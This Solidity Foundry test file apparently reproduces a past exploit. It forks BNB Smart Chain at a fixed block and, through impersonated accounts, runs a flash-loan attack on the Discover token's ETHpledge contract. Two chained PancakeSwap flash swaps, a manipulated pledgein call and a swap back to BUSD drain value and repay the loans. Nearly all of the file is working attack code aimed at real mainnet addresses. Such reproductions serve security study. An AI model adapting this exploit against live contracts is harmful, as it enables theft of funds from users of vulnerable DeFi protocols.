// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.15;

import "./../interface.sol";
import {Test, console} from "forge-std/Test.sol";
import {Translation} from "./MyOwnTranslation.sol";
import "./utils.sol";

interface ETHpledge {
    function pledgein(address fatheraddr, uint256 amountt) external returns (bool);
}

// Expected error. [FAIL. Reason: Pancake: INSUFFICIENT_INPUT_AMOUNT]
// Because we don't repay funds to pancake.

contract ContractTest is Test {
    using SafeMath for uint;

    IPancakePair PancakePair = IPancakePair(0x7EFaEf62fDdCCa950418312c6C91Aef321375A00);
    IPancakePair PancakePair2 = IPancakePair(0x92f961B6bb19D35eedc1e174693aAbA85Ad2425d);
    IERC20 busd = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 discover = IERC20(0x5908E4650bA07a9cf9ef9FD55854D4e1b700A267);
    ETHpledge ethpledge = ETHpledge(0xe732a7bD6706CBD6834B300D7c56a8D2096723A7);
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    uint256 flag;
    Translation translation;

    constructor() {
        cheats.createSelectFork("bsc", 18_446_845); // fork bsc at block 18446845
        busd.approve(address(ethpledge), type(uint256).max);
        discover.approve(address(ethpledge), type(uint256).max);
    }

    // 部署本地合约
    function setUp() public {
        vm.prank(0x446247bb10B77D1BCa4D4A396E014526D1ABA277);
        translation = new Translation();
        console.log("Now my attackCOntract translation is in :", address(translation));
    }

    //============================ 开始攻击 ================================//
    function testExploit2() public returns (bool) {
        vm.startBroadcast(0x53f78A071d04224B8e254E243fFfc6D9f2f3Fa23);
        // 冒充账户进行转账，调用invest。
        busd.transfer(address(translation), 1.1e18); //他自己没有
        translation.invest();
        vm.stopBroadcast();

        vm.startBroadcast(0x446247bb10B77D1BCa4D4A396E014526D1ABA277);
        console.log("This contract is:", address(this));
        bytes memory data = abi.encode(address(this), 2_100_000_000_000_000_000_000);
        console.log("Before Attack, BUSD balance of this COntract:", busd.balanceOf(address(this)));
        console.log("Before Attack, Discover balance of this COntract:", discover.balanceOf(address(this)));

        //============================ First swap ==============================//
        // 从pair1置换了2100
        PancakePair.swap(2_100_000_000_000_000_000_000, 0, address(this), data);

        //============================= 攻击结束 ================================//
        console.log("After whole attack , the busd balance of this contract is :", busd.balanceOf(address(this)));
        console.log(
            "After whole attack , the discover balance of this contract is :",
            discover.balanceOf(address(this))
        );
    }

    function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) public {
        if (flag == 1) {
            // 确保只有第二次闪电贷回调能进入这里
            console.log("After two flashswap, BUSD balance of this contract:", busd.balanceOf(address(this)));
            console.log("After two flashswap, busd balance of translation:", busd.balanceOf(address(translation)));
            ethpledge.pledgein(address(translation), 2_000_000_000_000_000_000_000);
            console.log("After two flashswap, Discover balance of this contract:", discover.balanceOf(address(this)));
            console.log(
                "After two flashswap, discover balance of translation:",
                discover.balanceOf(address(translation))
            );

            //========================= first repay ================================//
            busd.transfer(address(PancakePair2), 19870209617521645543725);
            flag = 2;
        }
        if (flag == 0) {
            // 确保只有第一次闪电贷回调能进入这
            console.log("After first swap, BUSD balance of this COntract:", busd.balanceOf(address(this)));
            bytes memory data = abi.encode(address(this), 19_810_777_285_664_651_588_959);
            flag = 1;
            PancakePair2.swap(19_810_777_285_664_651_588_959, 0, address(this), data);

            bool success = translation._transfer(address(this));
            console.log(
                "Now,After repay the first debt, this contract has Discover:",
                discover.balanceOf(address(this))
            );
            console.log("After repay the first debt, BUSD balance of this cpntract:", busd.balanceOf(address(this)));

            //=========================== 计算 =================================//
            address factory = 0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73;
            address input = 0x5908E4650bA07a9cf9ef9FD55854D4e1b700A267;
            address output = 0x55d398326f99059fF775485246999027B3197955;
            IPancakePair pair = IPancakePair(PancakeLibrary.pairFor(factory, input, output));

            discover.transfer(address(pair), 62536761454652895417957);
            console.log("address of pair is :", address(pair));
            (uint reserve0, uint reserve1, ) = pair.getReserves();
            (uint reserveInput, uint reserveOutput) = (reserve1, reserve0);
            uint amountInput = discover.balanceOf(address(pair)).sub(reserveInput);
            uint amountOutput = PancakeLibrary.getAmountOut(amountInput, reserveInput, reserveOutput);
            (uint amount0Out, uint amount1Out) = (amountOutput, uint(0));

            //=========================== 使用discover换取busd并偿还第二笔贷款 ======================//
            discover.approve(
                0x10ED43C718714eb63d5aA57B78B54704E256024E,
                115792089237316195423570985008687907853269984665640564039457584007913129639935
            );
            pair.swap(amount0Out, amount1Out, address(this), new bytes(0));

            console.log("start repay the second debt:");
            busd.transfer(address(PancakePair), 2106000000000000000000);
        }

    }

    receive() external payable {}
}


